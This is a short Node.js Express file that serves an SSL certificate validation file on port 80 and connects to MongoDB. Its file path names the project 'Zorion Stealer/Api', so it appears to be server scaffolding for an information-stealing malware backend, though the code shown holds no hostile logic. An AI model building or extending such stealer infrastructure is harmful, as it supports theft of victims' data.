
const mongoose = require('mongoose');
const express = require('express');
const app = express();
const config = require("../config");


app.get(`/.well-known/pki-validation/${config.ssltxtname}.txt`, (req, res) => {
    res.sendFile(`/Users/${config.pcname}/Desktop/Zorion Stealer/Api/.well-known/pki-validation/${config.ssltxtname}.txt`);
  });


app.listen(80, () => {
  console.log(`Listening on port 80`);
  mongoose.connect(config.mongodb, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log('Mongoose connection successful.'))
  .catch(() => console.log('Mongoose connection error.'));
});
